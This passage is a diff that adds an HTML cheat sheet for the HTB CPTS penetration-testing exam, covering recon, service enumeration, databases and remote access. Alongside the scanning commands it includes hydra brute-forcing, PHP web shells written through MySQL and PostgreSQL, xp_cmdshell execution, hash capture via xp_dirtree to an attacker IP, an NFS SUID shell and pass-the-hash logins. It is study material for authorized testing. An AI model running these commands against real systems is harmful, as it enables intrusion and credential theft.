@@ -1,0 +1,1199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CPTS EXAM VAULT</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:#080c10;--bg2:#0d1117;--bg3:#111820;--border:#1a2a3a;
+    --accent:#00ff88;--accent2:#00cfff;--accent3:#ff6b35;--accent4:#ffcc00;
+    --text:#c9d1d9;--text-dim:#6b7a8a;--code-bg:#0a0f14;--red:#ff4757;--purple:#b39ddb;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;font-size:15px;display:flex;height:100vh;overflow:hidden;}
+  body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.015) 2px,rgba(0,255,136,.015) 4px);pointer-events:none;z-index:9999;}
+  #sidebar{width:255px;min-width:255px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;}
+  #logo{padding:16px 16px 10px;border-bottom:1px solid var(--border);}
+  #logo .title{font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--accent);letter-spacing:3px;text-transform:uppercase;}
+  #logo .sub{font-size:10px;color:var(--text-dim);letter-spacing:1px;margin-top:2px;}
+  .blink{display:inline-block;width:8px;height:13px;background:var(--accent);margin-left:3px;vertical-align:middle;animation:blink 1s step-end infinite;}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+  #search-wrap{padding:8px 10px;border-bottom:1px solid var(--border);}
+  #search{width:100%;background:var(--code-bg);border:1px solid var(--border);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:12px;padding:7px 10px;outline:none;border-radius:2px;transition:border-color .2s;}
+  #search:focus{border-color:var(--accent);}
+  #search::placeholder{color:var(--text-dim);}
+  #nav{flex:1;overflow-y:auto;padding:4px 0;}
+  #nav::-webkit-scrollbar{width:3px;}
+  #nav::-webkit-scrollbar-thumb{background:var(--border);}
+  .nav-group{margin-bottom:2px;}
+  .nav-group-label{font-size:9px;letter-spacing:2px;color:var(--text-dim);text-transform:uppercase;padding:7px 14px 3px;font-family:'Share Tech Mono',monospace;}
+  .nav-item{display:flex;align-items:center;gap:8px;padding:6px 14px;cursor:pointer;font-size:13px;font-weight:600;color:var(--text-dim);border-left:2px solid transparent;transition:all .15s;letter-spacing:.4px;}
+  .nav-item:hover{color:var(--text);background:rgba(255,255,255,.03);}
+  .nav-item.active{color:var(--accent);border-left-color:var(--accent);background:rgba(0,255,136,.05);}
+  .dot{width:5px;height:5px;border-radius:50%;background:var(--text-dim);flex-shrink:0;transition:background .15s;}
+  .nav-item.active .dot{background:var(--accent);box-shadow:0 0 6px var(--accent);}
+  #main{flex:1;display:flex;flex-direction:column;overflow:hidden;}
+  #topbar{height:42px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 18px;gap:10px;}
+  #breadcrumb{font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--text-dim);}
+  #breadcrumb span{color:var(--accent2);}
+  #stats{margin-left:auto;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text-dim);display:flex;gap:14px;}
+  .s{color:var(--accent4);}
+  #content{flex:1;overflow-y:auto;padding:22px 28px;background:var(--bg);}
+  #content::-webkit-scrollbar{width:4px;}
+  #content::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px;}
+  .section{display:none;animation:fadeIn .2s ease;}
+  .section.active{display:block;}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+  h1{font-family:'Share Tech Mono',monospace;font-size:17px;color:var(--accent);letter-spacing:3px;text-transform:uppercase;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--border);}
+  h1::before{content:'> ';opacity:.5;}
+  h2{font-size:14px;font-weight:700;color:var(--accent2);letter-spacing:2px;text-transform:uppercase;margin:18px 0 8px;display:flex;align-items:center;gap:6px;}
+  h2::before{content:'##';font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text-dim);}
+  h3{font-size:13px;font-weight:700;color:var(--accent3);letter-spacing:1px;margin:12px 0 7px;text-transform:uppercase;}
+  .code-wrap{position:relative;margin:8px 0;}
+  .code-label{background:var(--border);color:var(--text-dim);font-family:'Share Tech Mono',monospace;font-size:10px;padding:2px 9px;display:inline-block;letter-spacing:1px;border-radius:2px 2px 0 0;}
+  .code-label.bash{color:var(--accent);}
+  .code-label.powershell{color:var(--accent2);}
+  .code-label.php{color:var(--purple);}
+  .code-label.sql{color:var(--accent4);}
+  pre{background:var(--code-bg);border:1px solid var(--border);border-radius:0 2px 2px 2px;padding:12px 14px;overflow-x:auto;position:relative;}
+  pre::-webkit-scrollbar{height:3px;}
+  pre::-webkit-scrollbar-thumb{background:var(--border);}
+  code{font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.75;color:#a8c1d4;}
+  .copy-btn{position:absolute;top:7px;right:7px;background:var(--border);border:none;color:var(--text-dim);font-family:'Share Tech Mono',monospace;font-size:10px;padding:3px 7px;cursor:pointer;border-radius:2px;transition:all .2s;letter-spacing:1px;}
+  .copy-btn:hover{background:var(--accent);color:#000;}
+  .copy-btn.copied{background:var(--accent);color:#000;}
+  table{width:100%;border-collapse:collapse;margin:10px 0;font-size:13px;}
+  th{background:var(--bg3);color:var(--accent2);font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:1px;padding:7px 11px;text-align:left;border:1px solid var(--border);text-transform:uppercase;}
+  td{padding:6px 11px;border:1px solid var(--border);color:var(--text);vertical-align:top;}
+  tr:hover td{background:rgba(255,255,255,.02);}
+  td code,:not(pre)>code{background:var(--bg3);color:var(--accent3);padding:1px 5px;border-radius:2px;font-size:11px;font-family:'JetBrains Mono',monospace;}
+  .checklist{list-style:none;margin:10px 0;}
+  .checklist li{display:flex;align-items:flex-start;gap:9px;padding:5px 0;border-bottom:1px solid rgba(255,255,255,.03);font-size:14px;line-height:1.5;}
+  .checklist li::before{content:'□';color:var(--accent);font-size:14px;flex-shrink:0;}
+  .alert{border-left:3px solid;padding:9px 13px;margin:10px 0;background:rgba(255,255,255,.02);font-size:13px;border-radius:0 2px 2px 0;}
+  .alert.red{border-color:var(--red);color:var(--red);}
+  .alert.green{border-color:var(--accent);}
+  .alert.yellow{border-color:var(--accent4);color:var(--accent4);}
+  .alert.blue{border-color:var(--accent2);color:var(--accent2);}
+  .home-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;margin-top:18px;}
+  .home-card{background:var(--bg2);border:1px solid var(--border);padding:14px;cursor:pointer;transition:all .2s;border-radius:2px;}
+  .home-card:hover{border-color:var(--accent);background:rgba(0,255,136,.04);transform:translateY(-1px);}
+  .card-icon{font-size:18px;margin-bottom:7px;}
+  .card-title{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent);letter-spacing:1px;text-transform:uppercase;margin-bottom:3px;}
+  .terminal-intro{font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--text-dim);line-height:1.9;margin-bottom:18px;padding:13px;background:var(--code-bg);border:1px solid var(--border);border-radius:2px;}
+  .terminal-intro .cmd{color:var(--accent);}
+  ul{padding-left:18px;margin:8px 0;}
+  ul li{margin:5px 0;line-height:1.6;}
+  strong{color:var(--accent4);}
+</style>
+</head>
+<body>
+<div id="sidebar">
+  <div id="logo">
+    <div class="title">CPTS VAULT<span class="blink"></span></div>
+    <div class="sub">HTB Certified Pen Test Specialist</div>
+  </div>
+  <div id="search-wrap">
+    <input type="text" id="search" placeholder="/ search..." autocomplete="off" spellcheck="false">
+  </div>
+  <nav id="nav">
+    <div class="nav-group">
+      <div class="nav-group-label">Core</div>
+      <div class="nav-item active" data-section="home"><span class="dot"></span>Home</div>
+      <div class="nav-item" data-section="checklist"><span class="dot"></span>Exam Day Checklist</div>
+    </div>
+    <div class="nav-group">
+      <div class="nav-group-label">Reconnaissance</div>
+      <div class="nav-item" data-section="passive"><span class="dot"></span>Passive Recon</div>
+      <div class="nav-item" data-section="active"><span class="dot"></span>Active Recon</div>
+      <div class="nav-item" data-section="nmap"><span class="dot"></span>Nmap Cheatsheet</div>
+      <div class="nav-item" data-section="services"><span class="dot"></span>Service Enum Map</div>
+    </div>
+    <div class="nav-group">
+      <div class="nav-group-label">Footprinting</div>
+      <div class="nav-item" data-section="ftp-smb"><span class="dot"></span>FTP / SMB / NFS</div>
+      <div class="nav-item" data-section="dns"><span class="dot"></span>DNS</div>
+      <div class="nav-item" data-section="smtp"><span class="dot"></span>SMTP / IMAP / POP3</div>
+      <div class="nav-item" data-section="databases"><span class="dot"></span>Databases</div>
+      <div class="nav-item" data-section="remote"><span class="dot"></span>SSH / RDP / WinRM</div>
+    </div>
+    <div class="nav-group">
+      <div class="nav-group-label">Exploitation</div>
+      <div class="nav-item" data-section="filetransfer"><span class="dot"></span>File Transfers</div>
+      <div class="nav-item" data-section="shells"><span class="dot"></span>Shells & Payloads</div>
+      <div class="nav-item" data-section="metasploit"><span class="dot"></span>Metasploit</div>
+    </div>
+    <div class="nav-group">
+      <div class="nav-group-label">Privilege Escalation</div>
+      <div class="nav-item" data-section="linux-privesc"><span class="dot"></span>Linux PrivEsc</div>
+      <div class="nav-item" data-section="win-privesc"><span class="dot"></span>Windows PrivEsc</div>
+    </div>
+    <div class="nav-group">
+      <div class="nav-group-label">Active Directory</div>
+      <div class="nav-item" data-section="ad-enum"><span class="dot"></span>AD Enumeration</div>
+      <div class="nav-item" data-section="ad-attacks"><span class="dot"></span>AD Attacks</div>
+      <div class="nav-item" data-section="kerberos"><span class="dot"></span>Kerberos Attacks</div>
+    </div>
+    <div class="nav-group">
+      <div class="nav-group-label">Web Attacks</div>
+      <div class="nav-item" data-section="web"><span class="dot"></span>Web Overview</div>
+      <div class="nav-item" data-section="sqli"><span class="dot"></span>SQL Injection</div>
+      <div class="nav-item" data-section="xss"><span class="dot"></span>XSS</div>
+      <div class="nav-item" data-section="lfi"><span class="dot"></span>LFI / RFI</div>
+      <div class="nav-item" data-section="fileupload"><span class="dot"></span>File Upload</div>
+      <div class="nav-item" data-section="ssrf"><span class="dot"></span>SSRF / XXE / SSTI</div>
+    </div>
+    <div class="nav-group">
+      <div class="nav-group-label">Post-Exploitation</div>
+      <div class="nav-item" data-section="lateral"><span class="dot"></span>Lateral Movement</div>
+      <div class="nav-item" data-section="postexploit"><span class="dot"></span>Post-Exploitation</div>
+      <div class="nav-item" data-section="pivoting"><span class="dot"></span>Pivoting & Tunneling</div>
+    </div>
+    <div class="nav-group">
+      <div class="nav-group-label">Reference</div>
+      <div class="nav-item" data-section="reporting"><span class="dot"></span>Report Template</div>
+      <div class="nav-item" data-section="wordlists"><span class="dot"></span>Wordlists</div>
+    </div>
+  </nav>
+</div>
+
+<div id="main">
+  <div id="topbar">
+    <div id="breadcrumb">CPTS-VAULT / <span id="bread-current">HOME</span></div>
+    <div id="stats">
+      <span>SECTIONS <span class="s">29</span></span>
+      <span>FLAGS <span class="s">12/14</span></span>
+      <span>DAYS <span class="s">10</span></span>
+      <span id="dl-btn" style="cursor:pointer;color:var(--accent);border:1px solid var(--accent);padding:1px 8px;border-radius:2px;font-size:10px;" title="Download HTML">⬇ SAVE</span>
+    </div>
+  </div>
+  <div id="content">
+
+    <!-- HOME -->
+    <div class="section active" id="s-home">
+      <h1>CPTS EXAM VAULT</h1>
+      <div class="terminal-intro">
+        <div class="cmd">$ cat README.md</div>
+        <div>HTB Certified Penetration Testing Specialist — Complete Reference</div>
+        <div>Exam: 10 days | 12/14 flags required | Black-box enterprise network</div>
+        <div>Methodology: RECON → SCAN → ENUM → EXPLOIT → PRIVESC → POST → PIVOT</div>
+        <div style="margin-top:8px;color:var(--accent2);">Press <kbd style="background:var(--border);padding:1px 5px;border-radius:2px;">/</kbd> to search · Click ⬇ SAVE in top-right to download</div>
+      </div>
+      <div class="home-grid" id="home-grid"></div>
+    </div>
+
+    <!-- CHECKLIST -->
+    <div class="section" id="s-checklist">
+      <h1>Exam Day Checklist</h1>
+      <div class="alert yellow">⚠ Read the scope carefully — note ALL in-scope IPs/ranges before doing anything.</div>
+      <ul class="checklist">
+        <li>Read scope carefully — note ALL in-scope IPs/ranges</li>
+        <li>Setup dirs: <code>mkdir -p ~/exam/{nmap,creds,loot,screenshots,notes}</code></li>
+        <li>Start notes file immediately — log EVERYTHING with timestamps</li>
+        <li>Screenshot every flag + steps that led to it (<code>hostname && whoami && cat flag.txt</code>)</li>
+        <li>Start report draft on Day 1 — never leave to the end</li>
+        <li>Track all credentials found (username:password/hash + where found)</li>
+        <li>Track all hosts (IP, OS, ports, access level, flags)</li>
+        <li>Methodology: RECON → SCAN → ENUMERATE SERVICES → FIND VULNS → EXPLOIT → POST-EXPLOIT → PIVOT → REPEAT</li>
+      </ul>
+      <h2>When Stuck</h2>
+      <ul>
+        <li>Re-enumerate — run full port scan if you only did top 1000</li>
+        <li>Check UDP ports</li>
+        <li>Enumerate web apps more thoroughly (more wordlists, more extensions)</li>
+        <li>Try harder on credentials (spray, reuse, default creds)</li>
+        <li>Run linPEAS/winPEAS again — you may have missed something</li>
+        <li>Run BloodHound if in AD environment — look for paths you haven't tried</li>
+      </ul>
+    </div>
+
+    <!-- PASSIVE RECON -->
+    <div class="section" id="s-passive">
+      <h1>Passive Recon</h1>
+      <h2>WHOIS</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>whois target.com</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>DNS Passive</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>subfinder -d target.com -o subdomains.txt
+amass enum -passive -d target.com
+# Certificate Transparency
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Google Dorks</h2>
+      <div class="code-wrap"><div class="code-label">DORKS</div><pre><code>site:target.com
+site:target.com filetype:pdf
+site:target.com inurl:admin
+intitle:"index of" site:target.com
+"target.com" ext:xml OR ext:conf OR ext:cnf OR ext:reg</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Shodan</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>shodan search "hostname:target.com"
+shodan host &lt;IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Email Harvesting</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>theHarvester -d target.com -b all</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- ACTIVE RECON -->
+    <div class="section" id="s-active">
+      <h1>Active Recon</h1>
+      <h2>DNS Active</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Zone transfer
+dig axfr @&lt;nameserver&gt; target.com
+host -t axfr target.com &lt;nameserver&gt;
+
+# Brute force subdomains
+gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.target.com
+
+# DNS records
+dig target.com ANY
+dig target.com MX
+dig -x &lt;IP&gt;   # Reverse lookup
+
+dnsenum --dnsserver &lt;NS&gt; --enum -p 0 -s 0 -f subdomains.txt target.com</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Virtual Host Enum</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>gobuster vhost -u http://&lt;IP&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -u http://target.com -H "Host: FUZZ.target.com" -fs &lt;default_size&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Web Directory Brute Force</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak -o gobuster.txt
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://target.com/FUZZ -fc 404
+feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- NMAP -->
+    <div class="section" id="s-nmap">
+      <h1>Nmap Cheatsheet</h1>
+      <div class="alert green">Always run fast scan first, then full port scan in background.</div>
+      <h2>Always Start Here</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Fast scan first
+nmap -sV -sC --open -oA nmap/initial &lt;IP&gt;
+
+# Full port scan (background)
+nmap -p- --min-rate 5000 -oA nmap/allports &lt;IP&gt;
+
+# Targeted version scan on found ports
+nmap -sV -sC -p &lt;ports&gt; -oA nmap/targeted &lt;IP&gt;
+
+# UDP (top 100)
+sudo nmap -sU --top-ports 100 -oA nmap/udp &lt;IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Key Flags</h2>
+      <table>
+        <tr><th>Flag</th><th>Description</th></tr>
+        <tr><td><code>-sV</code></td><td>Service/version detection</td></tr>
+        <tr><td><code>-sC</code></td><td>Default scripts</td></tr>
+        <tr><td><code>-sU</code></td><td>UDP scan</td></tr>
+        <tr><td><code>-sS</code></td><td>SYN scan (stealth, root)</td></tr>
+        <tr><td><code>-p-</code></td><td>All 65535 ports</td></tr>
+        <tr><td><code>--open</code></td><td>Show only open ports</td></tr>
+        <tr><td><code>--min-rate 5000</code></td><td>Speed up</td></tr>
+        <tr><td><code>-A</code></td><td>OS + scripts + traceroute</td></tr>
+        <tr><td><code>-oA</code></td><td>Output all formats</td></tr>
+        <tr><td><code>-Pn</code></td><td>Skip host discovery</td></tr>
+        <tr><td><code>-n</code></td><td>No DNS resolution</td></tr>
+      </table>
+      <h2>NSE Scripts</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>nmap --script smb-vuln* -p 445 &lt;IP&gt;
+nmap --script smb-enum-shares,smb-enum-users -p 445 &lt;IP&gt;
+nmap --script http-enum,http-title -p 80,443 &lt;IP&gt;
+nmap --script ftp-anon -p 21 &lt;IP&gt;
+nmap --script smtp-enum-users -p 25 &lt;IP&gt;
+nmap --script vuln -p &lt;ports&gt; &lt;IP&gt;
+nmap --script ms-sql-info,ms-sql-xp-cmdshell -p 1433 &lt;IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Network Sweep</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>nmap -sn 10.10.10.0/24
+sudo arp-scan --localnet
+netdiscover -r 10.10.10.0/24</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Parse Output</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>ports=$(grep "open" nmap/allports.gnmap | awk -F"/" '{print $1}' | tr '\n' ',' | sed 's/,$//')
+nmap -sV -sC -p$ports -oA nmap/targeted &lt;IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- SERVICE ENUM -->
+    <div class="section" id="s-services">
+      <h1>Service Enumeration</h1>
+      <h2>Port → What To Do</h2>
+      <table>
+        <tr><th>Port</th><th>Service</th><th>Action</th></tr>
+        <tr><td>21</td><td>FTP</td><td>Anon login, brute</td></tr>
+        <tr><td>22</td><td>SSH</td><td>Key auth, brute</td></tr>
+        <tr><td>25/465/587</td><td>SMTP</td><td>User enum</td></tr>
+        <tr><td>53</td><td>DNS</td><td>Zone transfer, brute</td></tr>
+        <tr><td>80/443/8080</td><td>HTTP/S</td><td>Full web app test</td></tr>
+        <tr><td>110/995</td><td>POP3</td><td>Brute, read mail</td></tr>
+        <tr><td>111/2049</td><td>RPC/NFS</td><td>showmount, mount</td></tr>
+        <tr><td>135</td><td>MSRPC</td><td>rpcclient enum</td></tr>
+        <tr><td>139/445</td><td>SMB</td><td>Null session, shares</td></tr>
+        <tr><td>143/993</td><td>IMAP</td><td>Read mail</td></tr>
+        <tr><td>161</td><td>SNMP</td><td>Community string enum</td></tr>
+        <tr><td>389/636</td><td>LDAP</td><td>AD enum, null bind</td></tr>
+        <tr><td>623</td><td>IPMI</td><td>Hash dump</td></tr>
+        <tr><td>1433</td><td>MSSQL</td><td>xp_cmdshell</td></tr>
+        <tr><td>3306</td><td>MySQL</td><td>File read/write</td></tr>
+        <tr><td>3389</td><td>RDP</td><td>Brute, PTH</td></tr>
+        <tr><td>5985/5986</td><td>WinRM</td><td>evil-winrm</td></tr>
+      </table>
+      <h2>SNMP</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &lt;IP&gt;
+snmpwalk -v2c -c public &lt;IP&gt;
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.2.1.25.4.2.1.2   # Running processes
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.2.1.6.13.1.3      # Open TCP ports</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>LDAP</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>ldapsearch -h &lt;IP&gt; -x -s base namingcontexts
+ldapsearch -h &lt;IP&gt; -x -b "DC=domain,DC=com"
+ldapsearch -h &lt;IP&gt; -x -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>RPC</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>rpcclient -U "" -N &lt;IP&gt;
+  > enumdomusers
+  > enumdomgroups
+  > querydominfo
+  > netshareenumall</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- FTP SMB NFS -->
+    <div class="section" id="s-ftp-smb">
+      <h1>FTP / SMB / NFS</h1>
+      <h2>FTP (Port 21)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Anonymous login
+ftp &lt;IP&gt;    # user: anonymous  pass: anonymous
+nmap --script ftp-anon,ftp-vsftpd-backdoor -p 21 &lt;IP&gt;
+wget -m --no-passive ftp://anonymous:anonymous@&lt;IP&gt;
+hydra -l user -P rockyou.txt ftp://&lt;IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>SMB (Ports 139, 445)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code># Null session
+smbclient -N -L //&lt;IP&gt;
+smbclient -N //&lt;IP&gt;/&lt;share&gt;
+
+# enum4linux
+enum4linux -a &lt;IP&gt;
+enum4linux-ng -A &lt;IP&gt; -oA results
+
+# SMBMap
+smbmap -H &lt;IP&gt;
+smbmap -H &lt;IP&gt; -u "user" -p "pass" -r &lt;share&gt;
+smbmap -H &lt;IP&gt; -u "user" -p "pass" --download "&lt;share&gt;/file.txt"
+
+# CrackMapExec
+crackmapexec smb &lt;IP&gt; -u user -p pass --shares
+crackmapexec smb &lt;IP&gt; -u user -p pass --users
+crackmapexec smb &lt;IP&gt; -u user -p pass -M spider_plus
+
+# Impacket
+impacket-smbclient user:pass@&lt;IP&gt;
+impacket-lookupsid user:pass@&lt;IP&gt;
+
+# Vuln check
+nmap --script smb-vuln-ms17-010 -p 445 &lt;IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>NFS (Ports 111, 2049)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>showmount -e &lt;IP&gt;
+sudo mount -t nfs &lt;IP&gt;:/share /mnt/nfs -o nolock
+
+# If no_root_squash: place SUID shell
+cp /bin/bash /mnt/nfs/bash
+chmod +s /mnt/nfs/bash
+# On target: ./bash -p</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- DNS -->
+    <div class="section" id="s-dns">
+      <h1>DNS</h1>
+      <div class="alert blue">Always try zone transfer first — it can dump all records.</div>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>dig &lt;domain&gt; ANY
+dig axfr @&lt;nameserver&gt; &lt;domain&gt;    # Zone transfer!
+dig -x &lt;IP&gt;                          # Reverse lookup
+
+dnsenum --dnsserver &lt;IP&gt; --enum -p 0 -s 0 -f subdomains.txt &lt;domain&gt;
+fierce --domain &lt;domain&gt;
+gobuster dns -d &lt;domain&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Internal DNS
+nslookup &lt;host&gt; &lt;DNS_IP&gt;
+cat /etc/resolv.conf
+cat /etc/hosts</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- SMTP -->
+    <div class="section" id="s-smtp">
+      <h1>SMTP / IMAP / POP3</h1>
+      <h2>SMTP (Port 25)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>nc -nv &lt;IP&gt; 25
+EHLO test
+VRFY root            # User enum
+EXPN root            # Expand list
+RCPT TO:&lt;user&gt;
+
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t &lt;IP&gt;
+nmap --script smtp-enum-users,smtp-commands,smtp-open-relay -p 25 &lt;IP&gt;
+swaks --to victim@target.com --from attacker@evil.com --server &lt;IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>IMAP (Port 143)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>nc -nv &lt;IP&gt; 143
+openssl s_client -connect &lt;IP&gt;:993
+
+A1 LOGIN username password
+A2 LIST "" *
+A3 SELECT INBOX
+A4 FETCH 1 (BODY[])
+A5 LOGOUT
+
+curl -k "imaps://&lt;IP&gt;/INBOX" --user user:pass</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>POP3 (Port 110)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>nc -nv &lt;IP&gt; 110
+USER username
+PASS password
+LIST
+RETR 1
+QUIT</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- DATABASES -->
+    <div class="section" id="s-databases">
+      <h1>Databases</h1>
+      <h2>MSSQL (Port 1433)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>impacket-mssqlclient user:pass@&lt;IP&gt;
+impacket-mssqlclient user:pass@&lt;IP&gt; -windows-auth</code><button class="copy-btn">COPY</button></pre></div>
+      <div class="code-wrap"><div class="code-label sql">SQL</div><pre><code>SELECT name FROM sys.databases;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+
+-- RCE via xp_cmdshell
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
+-- File read
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/system32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
+
+-- Steal hash (Responder)
+EXEC xp_dirtree '\\&lt;attacker_IP&gt;\share';
+
+-- Linked servers
+SELECT srvname FROM master..sysservers;
+EXEC ('xp_cmdshell ''whoami''') AT [linked_server];</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>MySQL (Port 3306)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>mysql -u root -p&lt;pass&gt; -h &lt;IP&gt;
+mysql -u root --password="" -h &lt;IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <div class="code-wrap"><div class="code-label sql">SQL</div><pre><code>show databases; use &lt;db&gt;; show tables;
+select load_file('/etc/passwd');   -- File read (needs FILE privilege)
+select "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE '/var/www/html/shell.php';
+select @@global.secure_file_priv;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>Oracle (Port 1521)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>odat all -s &lt;IP&gt;
+sqlplus user/pass@&lt;IP&gt;/XE</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>PostgreSQL (Port 5432)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>psql -h &lt;IP&gt; -U postgres
+\list  \c &lt;db&gt;  \dt  \du
+COPY (SELECT '&lt;?php system($_GET["cmd"]); ?&gt;') TO '/var/www/html/shell.php';</code><button class="copy-btn">COPY</button></pre></div>
+    </div>
+
+    <!-- REMOTE -->
+    <div class="section" id="s-remote">
+      <h1>SSH / RDP / WinRM / IPMI</h1>
+      <h2>SSH (Port 22)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>ssh -i id_rsa user@&lt;IP&gt;
+chmod 600 id_rsa
+hydra -l user -P rockyou.txt ssh://&lt;IP&gt;
+ssh -L &lt;local_port&gt;:&lt;target&gt;:&lt;target_port&gt; user@&lt;jump_host&gt;
+ssh -D 1080 -q -C -N user@&lt;pivot_IP&gt;   # Dynamic SOCKS</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>RDP (Port 3389)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>xfreerdp /v:&lt;IP&gt; /u:user /p:pass /cert:ignore +clipboard
+xfreerdp /v:&lt;IP&gt; /u:user /pth:&lt;NTLM&gt; /d:domain.com
+hydra -L users.txt -P passes.txt rdp://&lt;IP&gt;</code><button class="copy-btn">COPY</button></pre></div>
+      <h2>WinRM (5985/5986)</h2>
+      <div class="code-wrap"><div class="code-label bash">BASH</div><pre><code>evil-winrm -i &lt;IP&gt; -u user -p pass
+evil-winrm -i &lt;IP&gt; -u user -H &lt;NTLM&gt;
+crackmapexec winrm &lt;IP&gt; -u user -p pass -x "whoami"</code><button class="copy-btn">COPY</button></pre></div>
